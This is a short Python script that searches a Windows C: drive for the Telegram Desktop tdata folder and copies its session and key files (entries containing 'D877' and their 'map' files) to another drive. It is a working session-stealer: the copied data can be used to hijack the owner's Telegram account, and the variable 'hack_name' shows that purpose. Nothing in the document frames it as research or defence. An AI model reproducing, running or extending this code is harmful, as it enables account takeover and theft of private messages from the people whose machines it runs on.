import os
import shutil
import random


def main():
    basepath = "C:\\"
    folder_telegram = 'Telegram Desktop'
    hack_name = 'D877'
    hack_file = 'map'
    folder_write = "D:\\Telegram"
    exit = False

    walk = os.walk(basepath)
    for dirpath, dirnames, files in walk:
        for folder_name in dirnames:
            if folder_name == folder_telegram:
                path = dirpath + "\\" + folder_telegram + "\\tdata"
                with os.scandir(path) as it:
                    print(path)
                    print('Find folder...')
                    for entry in it:
                        if (entry.is_dir()) and (hack_name in entry.name):
                            path_write = folder_write + "\\" + entry.name
                            os.makedirs(path_write)
                            with os.scandir(path + "\\" + entry.name) as it2:
                                for i in it2:
                                    if hack_file in i.name:
                                        shutil.copyfile(path + "\\" + entry.name + "\\" + i.name,
                                                        path_write + "\\" + i.name)
                        if (entry.is_file()) and (hack_name in entry.name):
                            shutil.copyfile(path + "\\" + entry.name, folder_write + "\\" + entry.name)

                exit = True
                break
        if exit:
            break


if __name__ == '__main__':
    main()
